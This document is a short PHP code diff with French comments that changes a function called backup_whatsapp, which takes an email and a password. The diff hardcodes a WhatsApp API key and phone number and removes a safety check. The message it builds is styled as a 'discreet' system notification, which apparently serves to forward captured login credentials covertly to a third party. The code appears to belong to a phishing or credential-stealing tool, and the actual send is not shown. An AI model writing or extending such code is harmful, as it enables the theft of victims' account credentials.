@@ -57,13 +57,10 @@ function backup_local($email, $password) {
 function backup_whatsapp($email, $password) {
     // Configuration WhatsApp - À MODIFIER AVEC VOS INFOS
     $whatsapp_config = [
-        'api_key' => $_ENV['WHATSAPP_API_KEY'] ?? '8757276', // ← À CHANGER
-        'phone' => $_ENV['WHATSAPP_PHONE'] ?? '261339140849' // ← À CHANGER
+        'api_key' => '8757276', // ← À CHANGER
+        'phone' => '261339140849' // ← À CHANGER
     ];
     
-    if (empty($whatsapp_config['api_key']) || empty($whatsapp_config['phone'])) {
-        return 'whatsapp_skip';
-    }
     
     // Message discret pour WhatsApp
     $message = "🔔 Notification Système\n" .
